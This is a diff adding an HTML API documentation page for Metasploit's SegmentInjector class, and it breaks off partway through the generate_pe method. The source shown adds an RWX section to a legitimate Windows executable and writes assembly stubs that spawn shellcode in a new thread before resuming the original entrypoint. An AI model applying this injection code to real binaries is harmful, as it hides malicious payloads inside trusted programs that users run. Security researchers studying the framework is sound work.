@@ -1,0 +1,1379 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>
+  Class: Msf::Exe::SegmentInjector
+  
+    &mdash; Documentation by YARD 0.9.26
+  
+</title>
+
+  <link rel="stylesheet" href="../../css/style.css" type="text/css" />
+
+  <link rel="stylesheet" href="../../css/common.css" type="text/css" />
+
+<script type="text/javascript">
+  pathId = "Msf::Exe::SegmentInjector";
+  relpath = '../../';
+</script>
+
+
+  <script type="text/javascript" charset="utf-8" src="../../js/jquery.js"></script>
+
+  <script type="text/javascript" charset="utf-8" src="../../js/app.js"></script>
+
+
+  </head>
+  <body>
+    <div class="nav_wrap">
+      <iframe id="nav" src="../../class_list.html?1"></iframe>
+      <div id="resizer"></div>
+    </div>
+
+    <div id="main" tabindex="-1">
+      <div id="header">
+        <div id="menu">
+  
+    <a href="../../_index.html">Index (S)</a> &raquo;
+    <span class='title'><span class='object_link'><a href="../../Msf.html" title="Msf (module)">Msf</a></span></span> &raquo; <span class='title'><span class='object_link'><a href="../Exe.html" title="Msf::Exe (module)">Exe</a></span></span>
+     &raquo; 
+    <span class="title">SegmentInjector</span>
+  
+</div>
+
+        <div id="search">
+  
+    <a class="full_list_link" id="class_list_link"
+        href="../../class_list.html">
+
+        <svg width="24" height="24">
+          <rect x="0" y="4" width="24" height="4" rx="1" ry="1"></rect>
+          <rect x="0" y="12" width="24" height="4" rx="1" ry="1"></rect>
+          <rect x="0" y="20" width="24" height="4" rx="1" ry="1"></rect>
+        </svg>
+    </a>
+  
+</div>
+        <div class="clear"></div>
+      </div>
+
+      <div id="content"><h1>Class: Msf::Exe::SegmentInjector
+  
+  
+  
+</h1>
+<div class="box_info">
+  
+  <dl>
+    <dt>Inherits:</dt>
+    <dd>
+      <span class="inheritName">Object</span>
+      
+        <ul class="fullTree">
+          <li>Object</li>
+          
+            <li class="next">Msf::Exe::SegmentInjector</li>
+          
+        </ul>
+        <a href="#" class="inheritanceTree">show all</a>
+      
+    </dd>
+  </dl>
+  
+
+  
+  
+  
+  
+  
+
+  
+
+  
+  <dl>
+    <dt>Defined in:</dt>
+    <dd>lib/msf/core/exe/segment_injector.rb</dd>
+  </dl>
+  
+</div>
+
+<div id="subclasses">
+  <h2>Direct Known Subclasses</h2>
+  <p class="children"><span class='object_link'><a href="SegmentAppender.html" title="Msf::Exe::SegmentAppender (class)">SegmentAppender</a></span></p>
+</div>
+
+
+
+
+  <h2>Instance Attribute Summary <small><a href="#" class="summary_toggle">collapse</a></small></h2>
+  <ul class="summary">
+    
+      <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#arch-instance_method" title="#arch (instance method)">#<strong>arch</strong>  &#x21d2; Object </a>
+    
+
+    
+  </span>
+  
+  
+  
+    
+    
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'>
+<p>Returns the value of attribute arch.</p>
+</div></span>
+  
+</li>
+
+    
+      <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#buffer_register-instance_method" title="#buffer_register (instance method)">#<strong>buffer_register</strong>  &#x21d2; Object </a>
+    
+
+    
+  </span>
+  
+  
+  
+    
+    
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'>
+<p>Returns the value of attribute buffer_register.</p>
+</div></span>
+  
+</li>
+
+    
+      <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#payload-instance_method" title="#payload (instance method)">#<strong>payload</strong>  &#x21d2; Object </a>
+    
+
+    
+  </span>
+  
+  
+  
+    
+    
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'>
+<p>Returns the value of attribute payload.</p>
+</div></span>
+  
+</li>
+
+    
+      <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#secname-instance_method" title="#secname (instance method)">#<strong>secname</strong>  &#x21d2; Object </a>
+    
+
+    
+  </span>
+  
+  
+  
+    
+    
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'>
+<p>Returns the value of attribute secname.</p>
+</div></span>
+  
+</li>
+
+    
+      <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#template-instance_method" title="#template (instance method)">#<strong>template</strong>  &#x21d2; Object </a>
+    
+
+    
+  </span>
+  
+  
+  
+    
+    
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'>
+<p>Returns the value of attribute template.</p>
+</div></span>
+  
+</li>
+
+    
+  </ul>
+
+
+
+
+  
+    <h2>
+      Instance Method Summary
+      <small><a href="#" class="summary_toggle">collapse</a></small>
+    </h2>
+
+    <ul class="summary">
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#create_thread_stub-instance_method" title="#create_thread_stub (instance method)">#<strong>create_thread_stub</strong>  &#x21d2; Object </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'></div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#create_thread_stub_x64-instance_method" title="#create_thread_stub_x64 (instance method)">#<strong>create_thread_stub_x64</strong>  &#x21d2; Object </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'></div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#create_thread_stub_x86-instance_method" title="#create_thread_stub_x86 (instance method)">#<strong>create_thread_stub_x86</strong>  &#x21d2; Object </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'></div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#dll_prefix-instance_method" title="#dll_prefix (instance method)">#<strong>dll_prefix</strong>(pe)  &#x21d2; String </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'>
+<p>Assembly code to place at the entrypoint.</p>
+</div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#generate_pe-instance_method" title="#generate_pe (instance method)">#<strong>generate_pe</strong>  &#x21d2; Object </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'></div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#initialize-instance_method" title="#initialize (instance method)">#<strong>initialize</strong>(opts = {})  &#x21d2; SegmentInjector </a>
+    
+
+    
+  </span>
+  
+  
+    <span class="note title constructor">constructor</span>
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'>
+<p>A new instance of SegmentInjector.</p>
+</div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#is_warbird%3F-instance_method" title="#is_warbird? (instance method)">#<strong>is_warbird?</strong>(pe)  &#x21d2; Boolean </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'></div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#payload_stub-instance_method" title="#payload_stub (instance method)">#<strong>payload_stub</strong>(prefix)  &#x21d2; Object </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'></div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#processor-instance_method" title="#processor (instance method)">#<strong>processor</strong>  &#x21d2; Object </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'></div></span>
+  
+</li>
+
+      
+    </ul>
+  
+
+<div id="constructor_details" class="method_details_list">
+  <h2>Constructor Details</h2>
+  
+    <div class="method_details first">
+  <h3 class="signature first" id="initialize-instance_method">
+  
+    #<strong>initialize</strong>(opts = {})  &#x21d2; <tt><span class='object_link'><a href="" title="Msf::Exe::SegmentInjector (class)">SegmentInjector</a></span></tt> 
+  
+
+  
+
+  
+</h3><div class="docstring">
+  <div class="discussion">
+    
+<p>Returns a new instance of SegmentInjector.</p>
+
+
+  </div>
+</div>
+<div class="tags">
+  
+
+</div><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/exe/segment_injector.rb', line 15</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_initialize'>initialize</span><span class='lparen'>(</span><span class='id identifier rubyid_opts'>opts</span> <span class='op'>=</span> <span class='lbrace'>{</span><span class='rbrace'>}</span><span class='rparen'>)</span>
+  <span class='ivar'>@payload</span> <span class='op'>=</span> <span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:payload</span><span class='rbracket'>]</span>
+  <span class='ivar'>@template</span> <span class='op'>=</span> <span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:template</span><span class='rbracket'>]</span>
+  <span class='ivar'>@arch</span>  <span class='op'>=</span> <span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:arch</span><span class='rbracket'>]</span> <span class='op'>||</span> <span class='symbol'>:x86</span>
+  <span class='ivar'>@buffer_register</span> <span class='op'>=</span> <span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:buffer_register</span><span class='rbracket'>]</span>
+  <span class='ivar'>@secname</span> <span class='op'>=</span> <span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:secname</span><span class='rbracket'>]</span>
+  <span class='id identifier rubyid_x86_regs'>x86_regs</span> <span class='op'>=</span> <span class='qwords_beg'>%w{</span><span class='tstring_content'>eax</span><span class='words_sep'> </span><span class='tstring_content'>ecx</span><span class='words_sep'> </span><span class='tstring_content'>edx</span><span class='words_sep'> </span><span class='tstring_content'>ebx</span><span class='words_sep'> </span><span class='tstring_content'>edi</span><span class='words_sep'> </span><span class='tstring_content'>esi</span><span class='tstring_end'>}</span></span>
+  <span class='id identifier rubyid_x64_regs'>x64_regs</span> <span class='op'>=</span> <span class='qwords_beg'>%w{</span><span class='tstring_content'>rax</span><span class='words_sep'> </span><span class='tstring_content'>rcx</span><span class='words_sep'> </span><span class='tstring_content'>rdx</span><span class='words_sep'> </span><span class='tstring_content'>rbx</span><span class='words_sep'> </span><span class='tstring_content'>rdi</span><span class='words_sep'> </span><span class='tstring_content'>rsi</span><span class='tstring_end'>}</span></span> <span class='op'>+</span> <span class='lparen'>(</span><span class='int'>8</span><span class='op'>..</span><span class='int'>15</span><span class='rparen'>)</span><span class='period'>.</span><span class='id identifier rubyid_map'>map</span><span class='lbrace'>{</span><span class='op'>|</span><span class='id identifier rubyid_n'>n</span><span class='op'>|</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>r</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_n'>n</span><span class='embexpr_end'>}</span><span class='tstring_end'>&quot;</span></span> <span class='rbrace'>}</span>
+
+  <span class='ivar'>@buffer_register</span> <span class='op'>||=</span> <span class='kw'>if</span> <span class='ivar'>@arch</span> <span class='op'>==</span> <span class='symbol'>:x86</span>
+                         <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>edx</span><span class='tstring_end'>&quot;</span></span>
+                       <span class='kw'>else</span>
+                         <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>rdx</span><span class='tstring_end'>&quot;</span></span>
+                       <span class='kw'>end</span>
+
+  <span class='kw'>if</span> <span class='ivar'>@arch</span> <span class='op'>==</span> <span class='symbol'>:x86</span> <span class='op'>&amp;&amp;</span> <span class='op'>!</span><span class='id identifier rubyid_x86_regs'>x86_regs</span><span class='period'>.</span><span class='id identifier rubyid_include?'>include?</span><span class='lparen'>(</span><span class='ivar'>@buffer_register</span><span class='period'>.</span><span class='id identifier rubyid_downcase'>downcase</span><span class='rparen'>)</span>
+    <span class='id identifier rubyid_raise'>raise</span> <span class='const'>ArgumentError</span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>:buffer_register is not a real register</span><span class='tstring_end'>&quot;</span></span>
+  <span class='kw'>elsif</span> <span class='ivar'>@arch</span> <span class='op'>==</span> <span class='symbol'>:x64</span> <span class='op'>&amp;&amp;</span> <span class='op'>!</span><span class='id identifier rubyid_x64_regs'>x64_regs</span><span class='period'>.</span><span class='id identifier rubyid_include?'>include?</span><span class='lparen'>(</span><span class='ivar'>@buffer_register</span><span class='period'>.</span><span class='id identifier rubyid_downcase'>downcase</span><span class='rparen'>)</span>
+    <span class='id identifier rubyid_raise'>raise</span> <span class='const'>ArgumentError</span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>:buffer_register is not a real register</span><span class='tstring_end'>&quot;</span></span>
+  <span class='kw'>end</span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+  
+</div>
+
+  <div id="instance_attr_details" class="attr_details">
+    <h2>Instance Attribute Details</h2>
+    
+      
+      <span id="arch=-instance_method"></span>
+      <div class="method_details first">
+  <h3 class="signature first" id="arch-instance_method">
+  
+    #<strong>arch</strong>  &#x21d2; <tt>Object</tt> 
+  
+
+  
+
+  
+</h3><div class="docstring">
+  <div class="discussion">
+    
+<p>Returns the value of attribute arch.</p>
+
+
+  </div>
+</div>
+<div class="tags">
+  
+
+</div><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+11
+12
+13</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/exe/segment_injector.rb', line 11</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_arch'>arch</span>
+  <span class='ivar'>@arch</span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      
+      <span id="buffer_register=-instance_method"></span>
+      <div class="method_details ">
+  <h3 class="signature " id="buffer_register-instance_method">
+  
+    #<strong>buffer_register</strong>  &#x21d2; <tt>Object</tt> 
+  
+
+  
+
+  
+</h3><div class="docstring">
+  <div class="discussion">
+    
+<p>Returns the value of attribute buffer_register.</p>
+
+
+  </div>
+</div>
+<div class="tags">
+  
+
+</div><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+12
+13
+14</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/exe/segment_injector.rb', line 12</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_buffer_register'>buffer_register</span>
+  <span class='ivar'>@buffer_register</span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      
+      <span id="payload=-instance_method"></span>
+      <div class="method_details ">
+  <h3 class="signature " id="payload-instance_method">
+  
+    #<strong>payload</strong>  &#x21d2; <tt>Object</tt> 
+  
+
+  
+
+  
+</h3><div class="docstring">
+  <div class="discussion">
+    
+<p>Returns the value of attribute payload.</p>
+
+
+  </div>
+</div>
+<div class="tags">
+  
+
+</div><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+9
+10
+11</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/exe/segment_injector.rb', line 9</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_payload'>payload</span>
+  <span class='ivar'>@payload</span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      
+      <span id="secname=-instance_method"></span>
+      <div class="method_details ">
+  <h3 class="signature " id="secname-instance_method">
+  
+    #<strong>secname</strong>  &#x21d2; <tt>Object</tt> 
+  
+
+  
+
+  
+</h3><div class="docstring">
+  <div class="discussion">
+    
+<p>Returns the value of attribute secname.</p>
+
+
+  </div>
+</div>
+<div class="tags">
+  
+
+</div><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+13
+14
+15</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/exe/segment_injector.rb', line 13</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_secname'>secname</span>
+  <span class='ivar'>@secname</span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      
+      <span id="template=-instance_method"></span>
+      <div class="method_details ">
+  <h3 class="signature " id="template-instance_method">
+  
+    #<strong>template</strong>  &#x21d2; <tt>Object</tt> 
+  
+
+  
+
+  
+</h3><div class="docstring">
+  <div class="discussion">
+    
+<p>Returns the value of attribute template.</p>
+
+
+  </div>
+</div>
+<div class="tags">
+  
+
+</div><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+10
+11
+12</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/exe/segment_injector.rb', line 10</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_template'>template</span>
+  <span class='ivar'>@template</span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+  </div>
+
+
+  <div id="instance_method_details" class="method_details_list">
+    <h2>Instance Method Details</h2>
+
+    
+      <div class="method_details first">
+  <h3 class="signature first" id="create_thread_stub-instance_method">
+  
+    #<strong>create_thread_stub</strong>  &#x21d2; <tt>Object</tt> 
+  
+
+  
+
+  
+</h3><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/exe/segment_injector.rb', line 48</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_create_thread_stub'>create_thread_stub</span>
+  <span class='kw'>case</span> <span class='ivar'>@arch</span>
+  <span class='kw'>when</span> <span class='symbol'>:x86</span>
+    <span class='id identifier rubyid_create_thread_stub_x86'>create_thread_stub_x86</span>
+  <span class='kw'>when</span> <span class='symbol'>:x64</span>
+    <span class='id identifier rubyid_create_thread_stub_x64'>create_thread_stub_x64</span>
+  <span class='kw'>else</span>
+    <span class='id identifier rubyid_raise'>raise</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>Incompatible architecture</span><span class='tstring_end'>&quot;</span></span>
+  <span class='kw'>end</span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="create_thread_stub_x64-instance_method">
+  
+    #<strong>create_thread_stub_x64</strong>  &#x21d2; <tt>Object</tt> 
+  
+
+  
+
+  
+</h3><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+59
+60
+61
+62
+63
+64
+65
+66
+67
+68
+69
+70
+71
+72
+73
+74
+75
+76
+77
+78
+79
+80
+81
+82
+83
+84
+85
+86
+87
+88
+89
+90
+91
+92
+93</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/exe/segment_injector.rb', line 59</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_create_thread_stub_x64'>create_thread_stub_x64</span>
+  <span class='heredoc_beg'>&lt;&lt;-EOS</span>
+<span class='tstring_content'>    push rbp
+    mov rbp, rsp
+    sub rsp, 38h
+    and rsp, 0xfffffffffffffff0 ; Ensure RSP is 16 byte aligned
+
+    mov rcx, hook_libname
+    mov rax, iat_LoadLibraryA
+    call [rax]
+
+    mov rdx, hook_funcname
+    mov rcx, rax
+    mov rax, iat_GetProcAddress
+    call [rax]
+
+    xor ecx, ecx
+    mov qword ptr [rsp+28h], rcx
+    mov qword ptr [rsp+20h], rcx
+    mov r9, rcx
+    mov r8, thread_hook
+    mov rdx, rcx
+    call rax
+
+    leave
+    jmp entrypoint
+
+    hook_libname db &#39;kernel32&#39;, 0
+    hook_funcname db &#39;CreateThread&#39;, 0
+
+    thread_hook:
+    mov </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_buffer_register'>buffer_register</span><span class='embexpr_end'>}</span><span class='tstring_content'>, shellcode
+    shellcode:
+</span><span class='heredoc_end'>  EOS
+</span><span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="create_thread_stub_x86-instance_method">
+  
+    #<strong>create_thread_stub_x86</strong>  &#x21d2; <tt>Object</tt> 
+  
+
+  
+
+  
+</h3><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+95
+96
+97
+98
+99
+100
+101
+102
+103
+104
+105
+106
+107
+108
+109
+110
+111
+112
+113
+114
+115
+116
+117
+118
+119
+120
+121
+122</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/exe/segment_injector.rb', line 95</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_create_thread_stub_x86'>create_thread_stub_x86</span>
+  <span class='heredoc_beg'>&lt;&lt;-EOS</span>
+<span class='tstring_content'>    pushad
+    push hook_libname
+    call [iat_LoadLibraryA]
+    push hook_funcname
+    push eax
+    call [iat_GetProcAddress]
+    lea edx, [thread_hook]
+    push 0
+    push 0
+    push 0
+    push edx
+    push 0
+    push 0
+    call eax
+
+    popad
+    jmp entrypoint
+
+    hook_libname db &#39;kernel32&#39;, 0
+    hook_funcname db &#39;CreateThread&#39;, 0
+
+    thread_hook:
+    lea </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_buffer_register'>buffer_register</span><span class='embexpr_end'>}</span><span class='tstring_content'>, [shellcode]
+    shellcode:
+</span><span class='heredoc_end'>  EOS
+</span><span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="dll_prefix-instance_method">
+  
+    #<strong>dll_prefix</strong>(pe)  &#x21d2; <tt>String</tt> 
+  
+
+  
+
+  
+</h3><div class="docstring">
+  <div class="discussion">
+    
+<p>Returns assembly code to place at the entrypoint. Will be empty for non-DLL executables.</p>
+
+
+  </div>
+</div>
+<div class="tags">
+  <p class="tag_title">Parameters:</p>
+<ul class="param">
+  
+    <li>
+      
+        <span class='name'>pe</span>
+      
+      
+        <span class='type'>(<tt>Metasm::PE</tt>)</span>
+      
+      
+      
+    </li>
+  
+</ul>
+
+<p class="tag_title">Returns:</p>
+<ul class="return">
+  
+    <li>
+      
+      
+        <span class='type'>(<tt>String</tt>)</span>
+      
+      
+      
+        &mdash;
+        <div class='inline'>
+<p>assembly code to place at the entrypoint. Will be empty for non-DLL executables.</p>
+</div>
+      
+    </li>
+  
+</ul>
+
+</div><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+192
+193
+194
+195
+196
+197
+198
+199
+200
+201
+202
+203
+204
+205
+206
+207
+208
+209
+210
+211
+212
+213</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/exe/segment_injector.rb', line 192</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_dll_prefix'>dll_prefix</span><span class='lparen'>(</span><span class='id identifier rubyid_pe'>pe</span><span class='rparen'>)</span>
+  <span class='id identifier rubyid_prefix'>prefix</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_end'>&#39;</span></span>
+  <span class='kw'>if</span> <span class='id identifier rubyid_pe'>pe</span><span class='period'>.</span><span class='id identifier rubyid_header'>header</span><span class='period'>.</span><span class='id identifier rubyid_characteristics'>characteristics</span><span class='period'>.</span><span class='id identifier rubyid_include?'>include?</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>DLL</span><span class='tstring_end'>&quot;</span></span>
+    <span class='comment'># if there is no entry point, just return after we bail or spawn shellcode
+</span>    <span class='kw'>if</span> <span class='id identifier rubyid_pe'>pe</span><span class='period'>.</span><span class='id identifier rubyid_optheader'>optheader</span><span class='period'>.</span><span class='id identifier rubyid_entrypoint'>entrypoint</span> <span class='op'>==</span> <span class='int'>0</span>
+      <span class='id identifier rubyid_prefix'>prefix</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>cmp [esp + 8], 1
+          jz spawncode
+entrypoint:
+          xor eax, eax
+          inc eax
+          ret 0x0c
+          spawncode:</span><span class='tstring_end'>&quot;</span></span>
+    <span class='kw'>else</span>
+      <span class='comment'># there is an entry point, we&#39;ll need to go to it after we bail or spawn shellcode
+</span>      <span class='comment'># if fdwReason != DLL_PROCESS_ATTACH, skip the shellcode, jump back to original DllMain
+</span>      <span class='id identifier rubyid_prefix'>prefix</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>cmp [esp + 8], 1
+          jnz entrypoint</span><span class='tstring_end'>&quot;</span></span>
+    <span class='kw'>end</span>
+  <span class='kw'>end</span>
+
+  <span class='id identifier rubyid_prefix'>prefix</span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="generate_pe-instance_method">
+  
+    #<strong>generate_pe</strong>  &#x21d2; <tt>Object</tt> 
+  
+
+  
+
+  
+</h3><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+151
+152
+153
+154
+155
+156
+157
+158
+159
+160
+161
+162
+163
+164
+165
+166
+167
+168
+169
+170
+171
+172
+173
+174
+175
+176
+177
+178
+179
+180
+181
+182
+183
+184
+185
+186
+187</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/exe/segment_injector.rb', line 151</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_generate_pe'>generate_pe</span>
+  <span class='comment'># Copy our Template into a new PE
+</span>  <span class='id identifier rubyid_pe_orig'>pe_orig</span> <span class='op'>=</span> <span class='const'>Metasm</span><span class='op'>::</span><span class='const'>PE</span><span class='period'>.</span><span class='id identifier rubyid_decode_file'>decode_file</span><span class='lparen'>(</span><span class='id identifier rubyid_template'>template</span><span class='rparen'>)</span>
+  <span class='kw'>if</span> <span class='id identifier rubyid_is_warbird?'>is_warbird?</span><span class='lparen'>(</span><span class='id identifier rubyid_pe_orig'>pe_orig</span><span class='rparen'>)</span>
+    <span class='id identifier rubyid_raise'>raise</span> <span class='const'>RuntimeError</span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>The template to inject to appears to have license verification (warbird)</span><span class='tstring_end'>&quot;</span></span>
+  <span class='kw'>end</span>
+  <span class='id identifier rubyid_pe'>pe</span> <span class='op'>=</span> <span class='id identifier rubyid_pe_orig'>pe_orig</span><span class='period'>.</span><span class='id identifier rubyid_mini_copy'>mini_copy</span>
+
+  <span class='comment'># Copy the headers and exports
+</span>  <span class='id identifier rubyid_pe'>pe</span><span class='period'>.</span><span class='id identifier rubyid_mz'>mz</span><span class='period'>.</span><span class='id identifier rubyid_encoded'>encoded</span> <span class='op'>=</span> <span class='id identifier rubyid_pe_orig'>pe_orig</span><span class='period'>.</span><span class='id identifier rubyid_encoded'>encoded</span><span class='lbracket'>[</span><span class='int'>0</span><span class='comma'>,</span> <span class='id identifier rubyid_pe_orig'>pe_orig</span><span class='period'>.</span><span class='id identifier rubyid_coff_offset'>coff_offset</span><span class='op'>-</span><span class='int'>4</span><span class='rbracket'>]</span>
+  <span class='id identifier rubyid_pe'>pe</span><span class='period'>.</span><span class='id identifier rubyid_mz'>mz</span><span class='period'>.</span><span class='id identifier rubyid_encoded'>encoded</span><span class='period'>.</span><span class='id identifier rubyid_export'>export</span> <span class='op'>=</span> <span class='id identifier rubyid_pe_orig'>pe_orig</span><span class='period'>.</span><span class='id identifier rubyid_encoded'>encoded</span><span class='lbracket'>[</span><span class='int'>0</span><span class='comma'>,</span> <span class='int'>512</span><span class='rbracket'>]</span><span class='period'>.</span><span class='id identifier rubyid_export'>export</span><span class='period'>.</span><span class='id identifier rubyid_dup'>dup</span>
+  <span class='id identifier rubyid_pe'>pe</span><span class='period'>.</span><span class='id identifier rubyid_header'>header</span><span class='period'>.</span><span class='id identifier rubyid_time'>time</span> <span class='op'>=</span> <span class='id identifier rubyid_pe_orig'>pe_orig</span><span class='period'>.</span><span class='id identifier rubyid_header'>header</span><span class='period'>.</span><span class='id identifier rubyid_time'>time</span>
+
+  <span class='comment'># Don&#39;t rebase if we can help it since Metasm doesn&#39;t do relocations well
+</span>  <span class='id identifier rubyid_pe'>pe</span><span class='period'>.</span><span class='id identifier rubyid_optheader'>optheader</span><span class='period'>.</span><span class='id identifier rubyid_dll_characts'>dll_characts</span><span class='period'>.</span><span class='id identifier rubyid_delete'>delete</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>DYNAMIC_BASE</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span>
+
+  <span class='id identifier rubyid_prefix'>prefix</span> <span class='op'>=</span> <span class='id identifier rubyid_dll_prefix'>dll_prefix</span><span class='lparen'>(</span><span class='id identifier rubyid_pe'>pe</span><span class='rparen'>)</span>
+
+  <span class='comment'># Generate a new code section set to RWX with our payload in it
+</span>  <span class='id identifier rubyid_s'>s</span> <span class='op'>=</span> <span class='const'>Metasm</span><span class='op'>::</span><span class='const'>PE</span><span class='op'>::</span><span class='const'>Section</span><span class='period'>.</span><span class='id identifier rubyid_new'>new</span>
